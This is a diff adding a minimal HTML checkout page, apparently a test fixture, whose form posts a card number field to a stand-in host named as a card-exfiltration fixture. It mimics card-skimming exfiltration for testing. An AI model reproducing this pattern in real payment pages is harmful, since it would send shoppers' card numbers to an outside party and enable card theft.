@@ -1,0 +1,11 @@
+<!doctype html><meta charset="utf-8"><title>Checkout</title>
+<h1>Checkout</h1>
+<form id="f" action="http://card-exfil-fixture.example:5599/clean.html" method="post">
+  <input id="cardnumber" name="cardnumber" placeholder="Card number" autocomplete="cc-number">
+</form>
+<button id="go">Pay</button>
+<script>
+document.getElementById('go').addEventListener('click', function(){
+  document.getElementById('f').submit();
+});
+</script>
